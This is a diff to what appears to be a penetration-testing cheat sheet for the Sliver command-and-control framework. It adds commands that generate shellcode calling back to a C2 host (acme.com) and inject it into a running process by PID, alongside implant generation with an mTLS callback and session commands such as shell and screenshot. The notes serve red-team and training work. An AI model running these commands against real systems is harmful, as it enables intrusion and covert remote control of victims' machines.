@@ -268,7 +268,6 @@ $ ./sliver-client import ./<USERNAME>_example.com.cfg
 
 ```
 sliver > help generate
-sliver > https local-ip-address --lhost -D
 sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
@@ -313,6 +312,14 @@ sliver (NEARBY_LANGUAGE) > shell                                          // spa
 sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
 sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
 sliver (NEARBY_LANGUAGE) > background                                     // background the session
+```
+
+### Spawning new Sessions
+
+```c
+sliver (NEARBY_LANGUAGE) > interactive
+sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
+sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
 ```
 
 ### Port Forwarding
